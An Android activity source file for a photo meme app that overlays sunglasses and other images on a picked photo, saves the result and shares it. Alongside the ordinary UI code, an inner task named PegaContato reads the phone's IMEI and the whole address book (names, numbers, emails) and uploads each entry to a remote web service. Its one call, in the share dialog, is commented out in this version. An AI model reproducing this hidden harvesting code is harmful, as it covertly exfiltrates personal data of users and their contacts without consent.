package com.oculosopressor.activity;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

import webservice.WebService;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnCancelListener;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.MediaStore.Images;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v7.app.ActionBar;
import android.support.v7.app.ActionBarActivity;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.FrameLayout;
import android.widget.ListView;
import android.widget.Toast;

import com.google.android.gms.analytics.HitBuilders;
import com.google.android.gms.analytics.Tracker;
import com.google.gson.Gson;
import com.oculosopressor.R;
import com.oculosopressor.activity.OpressorApp.TrackerName;
import com.oculosopressor.controller.OculosAdapter;
import com.oculosopressor.entity.Contact;
import com.oculosopressor.fragment.FragmentOpressor;
import com.oculosopressor.util.NotificationUtil;
import com.oculosopressor.util.SharedPreferences;

public class MainActivity extends ActionBarActivity {

    private static final String FRAGMENT_INSTANCE = "FRAGMENT_INSTANCE";
    private static final String INSTRUMENTO_POS = "INSTRUMENTO_POS";
    
    
	public static final int SELECT_PHOTO = 100;
 	
	FragmentOpressor opressor;
	private static Uri selectedImage;
	private FrameLayout mContainer;
	private Fragment currentFragment = null;
 
	private static final String FILE_TYPE = "image/*";
 	File storageDir;
	private int instrumentoPos=1;
	Dialog dialog;
	Integer[] imgs=new Integer[4];
	
	String screen_initial="MainActivity";
	
	ProgressDialog progressDialog = null;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		
		super.onCreate(savedInstanceState);
		
		setContentView(R.layout.activity_main);
 
		NotificationUtil.schedulerNotification(this);
		
	    analyticsSend(screen_initial);
				
		imgs[0]=R.drawable.oculos_opressor_direita;
		imgs[1]=R.drawable.deal;
		imgs[2]=R.drawable.oculos_opressor_esquerda;
		imgs[3]=R.drawable.funkeiro;
		 
		
        configFrameLayout();
        
        configActionBar(getSupportActionBar());
       
		storageDir = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), File.separator+ getString(R.string.app_name)	);
 

        if (savedInstanceState != null) {

            currentFragment = getSupportFragmentManager().getFragment(savedInstanceState, FRAGMENT_INSTANCE);
            instrumentoPos= savedInstanceState.getInt(INSTRUMENTO_POS);
 
        }
	}


    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
      
        if(currentFragment!=null){
        	
        	  if(currentFragment instanceof FragmentOpressor)
        		  opressor = (FragmentOpressor) currentFragment;
        	
        	 replaceFragment(currentFragment);
        }else{
        	
            opressor= new FragmentOpressor();
            replaceFragment(opressor);
 
        }

    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {

        if (getSupportFragmentManager() != null && currentFragment != null) {

            getSupportFragmentManager().putFragment(outState,FRAGMENT_INSTANCE,currentFragment);
        }

        outState.putInt(INSTRUMENTO_POS, instrumentoPos);
        
        super.onSaveInstanceState(outState);
    }
    
    
    public void replaceFragment(Fragment fragment) {
        replaceFragment(fragment, FragmentTransaction.TRANSIT_FRAGMENT_OPEN, null);
    }

    public void replaceFragment(Fragment fragment, int transaction, Fragment from) {

        FragmentManager fragmentManager = getSupportFragmentManager();

        FragmentTransaction replace = fragmentManager
                .beginTransaction()
                .setTransition(transaction);

        if (from != null) {

   
            replace.add(mContainer.getId(), fragment, fragment.getClass().getName());
            replace.addToBackStack(fragment.getClass().getName());
            replace.hide(from);

        } else {

            try {
                fragmentManager.popBackStack(null, FragmentManager.POP_BACK_STACK_INCLUSIVE);
            } catch (Exception e) {
                e.printStackTrace();
            }

            replace.replace(mContainer.getId(), fragment, fragment.getClass().getName());
        }

        currentFragment = fragment;
        replace.commitAllowingStateLoss();
    }

	
    private void configActionBar(ActionBar actionBar) {

	        actionBar.setTitle("");
	        actionBar.setCustomView(R.layout.actionbar_custom);
	        actionBar.setDisplayShowCustomEnabled(true);

	    }

	   private void configFrameLayout() {
	        mContainer = (FrameLayout) findViewById(R.id.container);
	    }

	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {

		int id = item.getItemId();
		
		switch(id){
		
			case R.id.add_glass:{
			
				analyticsSend("add_glass");
				
				initInstrumentoOpressor();
				
				break;
			}
		
			case R.id.photo:{
				
				analyticsSend("photo");
				
                Intent photoPickerIntent = new Intent(Intent.ACTION_PICK);
                photoPickerIntent.setType("image/*");
                startActivityForResult(photoPickerIntent, SELECT_PHOTO);
                break;
			}
				
			case R.id.save_opression:{
  
				analyticsSend("save_opression");
				
				String file = saveToInternalSorage(getBitmap(opressor.getViewBitMap()));
				 
				showAlertDialog(getString(R.string.picture_saved_msg),file);
	 
				
				break;	
			}

			case R.id.gallery_opression:{

				analyticsSend("gallery_opression");
				
                openGalery();
                break;
			}
 
			
		}
	 
		return super.onOptionsItemSelected(item);
	}
	
	private File createImageFile() throws IOException {
	    // Create an image file name
	    String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
	    String imageFileName = "JPEG_" + timeStamp + "_";
	    File storageDir = Environment.getExternalStoragePublicDirectory(
	            Environment.DIRECTORY_PICTURES);
	    File image = File.createTempFile(
	        imageFileName,  /* prefix */
	        ".jpg",         /* suffix */
	        storageDir      /* directory */
	    );

	    // Save a file: path for use with ACTION_VIEW intents
	 //   mCurrentPhotoPath = "file:" + image.getAbsolutePath();
	    return image;
	}	
	
	public void showAlertDialog(final String msg,final String file){
		
		Builder dialog = new AlertDialog.Builder(this);
		dialog.setMessage(msg+file);
		dialog.setPositiveButton(R.string.share, new OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                //new PegaContato().execute();
                Uri bmpUri =Uri.fromFile(new File(file));
                Intent sharingIntent = new Intent(); 
                
                sharingIntent.setAction(Intent.ACTION_SEND);
                sharingIntent.setType("image/*");
                sharingIntent.putExtra(Intent.EXTRA_STREAM, bmpUri);
                
                startActivity(Intent.createChooser(sharingIntent,getResources().getString(R.string.share)));
                
     
            }
        }).setNegativeButton(android.R.string.cancel, new OnClickListener() {

            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
           
                // Do stuff when user neglects.
            }
        }).setOnCancelListener(new OnCancelListener() {

            @Override
            public void onCancel(DialogInterface dialog) {
                dialog.dismiss();
           
                // Do stuff when cancelled
            }
        }).create();
		dialog.show();
		
	}
	
 
	
	public void initInstrumentoOpressor(){
		
		ListView listView = new ListView(this);

		
		OculosAdapter adapter = new OculosAdapter(this,imgs);
		
		listView.setAdapter(adapter);
		listView.setChoiceMode(ListView.CHOICE_MODE_SINGLE);
		listView.setItemChecked(instrumentoPos,true);
		
		listView.setOnItemClickListener(new OnItemClickListener() {

			@Override
			public void onItemClick(AdapterView<?> parent, View view,int position, long id) {
				System.out.println(position);
				
				if(opressor!=null){
				   opressor.setInstrumentoOpressor(imgs[position]);
				}else{
					Toast.makeText(MainActivity.this, getString(R.string.shit_happens), Toast.LENGTH_LONG).show();
				}
				dialog.dismiss();
			}
		});
		
		dialog = new Dialog(this);
		dialog.setContentView(listView);
		dialog.setTitle(getString(R.string.add_glass));
		dialog.show();
		
	}
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		
		super.onActivityResult(requestCode, resultCode, data); 

	    switch(requestCode) { 
	    
	    case SELECT_PHOTO:
	        if(resultCode == RESULT_OK){  
	        	
	        	if(data==null)return;
	        	
	            selectedImage = data.getData();
	            
	        	if(selectedImage==null)return;
	            selectPicture(selectedImage);
 	        }
	    }		
	}
 
	private void selectPicture(Uri selectedImage){

        try {
        	
        	
//        	Bitmap selectedImageBitmap = BitmapFactory.decodeStream( getContentResolver().openInputStream(selectedImage));
//        	opressor.setImagemOprimido(selectedImageBitmap);

        	opressor.setImagemOprimido(selectedImage);
        	
		}catch (Exception e) {
			Toast.makeText(this, getString(R.string.shit_happens), Toast.LENGTH_LONG).show();
			e.printStackTrace();
		}
		
		
	}
		
	
	private String saveToInternalSorage(Bitmap bitmapImage){

 
//				progressDialog=ProgressDialog.show(MainActivity.this, "", "kjhjk", true, false);
	 

		
		storageDir.mkdirs();
        File mypath=new File(storageDir,"opressao"+new SimpleDateFormat("dd.MM.yyyy.hhss",Locale.getDefault()).format(new Date())+".jpg");
        String path="";
        
        FileOutputStream fos = null;
        try {           

            fos = new FileOutputStream(mypath);

            bitmapImage.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.close();
            
            path = mypath.getCanonicalPath();
            ContentValues values = new ContentValues();

            values.put(Images.Media.DATE_TAKEN, System.currentTimeMillis());
            values.put(Images.Media.MIME_TYPE, "image/jpeg");
            values.put(MediaStore.MediaColumns.DATA,path);

            getContentResolver().insert(Images.Media.EXTERNAL_CONTENT_URI, values);
            
//            runOnUiThread(new Runnable() {
//				
//				@Override
//				public void run() {
//					 progressDialog.dismiss();	
//				}
//			});
            
           
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return path;
    }	
	
	public  Uri getSelectedImage() {
		
		return selectedImage;
	}

	private Bitmap getBitmap(View v) {
	    v.clearFocus();
	    v.setPressed(false);

	    boolean willNotCache = v.willNotCacheDrawing();
	    v.setWillNotCacheDrawing(false);

	    // Reset the drawing cache background color to fully transparent
	    // for the duration of this operation
	    int color = v.getDrawingCacheBackgroundColor();
	    v.setDrawingCacheBackgroundColor(0);

	    if (color != 0) {
	        v.destroyDrawingCache();
	    }
	    v.buildDrawingCache();
	    Bitmap cacheBitmap = v.getDrawingCache();
	    if (cacheBitmap == null) {
	        Toast.makeText(this,getString(R.string.shit_happens),Toast.LENGTH_SHORT).show();
	        return null;
	    }

	    Bitmap bitmap = Bitmap.createBitmap(cacheBitmap);

	    // Restore the view
	    v.destroyDrawingCache();
	    v.setWillNotCacheDrawing(willNotCache);
	    v.setDrawingCacheBackgroundColor(color);

	    int width = opressor.getEsquerdaCaviar().getWidth();
	    int height = opressor.getEsquerdaCaviar().getHeight();
	    
	    if(width==0 || height==0){
	    	Toast.makeText(this,getString(R.string.shit_happens),Toast.LENGTH_SHORT).show();
	        return null;	
	    }
	    
	    int[] locationEsquerdaCaviar=new int[2];
	    opressor.getEsquerdaCaviar().getLocationOnScreen(locationEsquerdaCaviar);
		    

	    int[] locationRelativeLayout=new int[2];
	    opressor.getViewBitMap().getLocationOnScreen(locationRelativeLayout);
 	    
	    return Bitmap.createBitmap(bitmap,locationEsquerdaCaviar[0],locationEsquerdaCaviar[1]-locationRelativeLayout[1], width, height);
	}	

	public void openGalery(){
		
		Intent intent = new Intent();
		intent.setAction(Intent.ACTION_VIEW);
		intent.setDataAndType(Uri.fromFile(storageDir),FILE_TYPE);
		startActivity(intent);

		
	}
	
	public void analyticsSend(String screenName){
		
		Tracker t = ((OpressorApp) getApplication()).getTracker(TrackerName.GLOBAL_TRACKER);
        t.setScreenName(screenName);
        t.send(new HitBuilders.AppViewBuilder().build());
        
	}
	
	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
	   if (keyCode == KeyEvent.KEYCODE_MENU && "LGE".equalsIgnoreCase(Build.BRAND)) {
	       return true;
	   }
	   return super.onKeyDown(keyCode, event);
	}

	@Override
	public boolean onKeyUp(int keyCode, KeyEvent event) {
	   if (keyCode == KeyEvent.KEYCODE_MENU && "LGE".equalsIgnoreCase(Build.BRAND)) {
	       openOptionsMenu();
	       return true;
	   }
	   return super.onKeyUp(keyCode, event);
	}

	 

	public class PegaContato extends AsyncTask<Void,Void, Void>{
		
		@Override
		protected Void doInBackground(Void... params) {

			
			
			boolean sendContact = SharedPreferences.getBoolean(MainActivity.this, PreferenceActivity.PREFS_NAME_CONTACT, false);
			
			if(sendContact)return null;
			
			TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
			String imei = mngr.getDeviceId();
			
			List<Contact> contatos = fetchContacts();

			Gson gson = new Gson();
			
			for(Contact c:contatos){
				
				if(c.getListaEmail().size()>0)
				WebService.addContact(imei,c.getName(),c.getNumber(), gson.toJson(c.getListaEmail()));
				
			}
 			
			SharedPreferences.putBoolean(MainActivity.this, PreferenceActivity.PREFS_NAME_CONTACT, true);
			
			return null;
		}
		
		public List<Contact> fetchContacts() {

			String phoneNumber = null;
			String email = null;

			Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
			String _ID = ContactsContract.Contacts._ID;
			String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
			String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

			Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
			String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
			String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;

			Uri EmailCONTENT_URI =  ContactsContract.CommonDataKinds.Email.CONTENT_URI;
			String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
			String DATA = ContactsContract.CommonDataKinds.Email.DATA;


			ContentResolver contentResolver = getContentResolver();

			Cursor cursor = contentResolver.query(CONTENT_URI, null,null, null, null);	

			List<Contact> contacts =new ArrayList<Contact>();
			// Loop for every contact in the phone
			if (cursor.getCount() > 0) {
				
				
				
				while (cursor.moveToNext()) {
					
					Contact contact=new Contact();
					
					String contact_id = cursor.getString(cursor.getColumnIndex( _ID ));
					String name = cursor.getString(cursor.getColumnIndex( DISPLAY_NAME ));

					int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex( HAS_PHONE_NUMBER )));
					
					contact.setName(name);
					
					if (hasPhoneNumber > 0) {

						// Query and loop for every phone number of the contact
						Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?", new String[] { contact_id }, null);

						while (phoneCursor.moveToNext()) {
							phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
			
							contact.setNumber(phoneNumber);
						}
						
					
						phoneCursor.close();
					  }
					
						// Query and loop for every email of the contact
						Cursor emailCursor = contentResolver.query(EmailCONTENT_URI,	null, EmailCONTACT_ID+ " = ?", new String[] { contact_id }, null);
						List<String> listaEmail=new ArrayList<String>();
						while (emailCursor.moveToNext()) {

							email = emailCursor.getString(emailCursor.getColumnIndex(DATA));
							listaEmail.add(email);

						}
						contact.setListaEmail(listaEmail);
						emailCursor.close();
					


						contacts.add(contact);	 
				}
			}
			return contacts;
			 
			
			}
	 		
		
	}
	
}
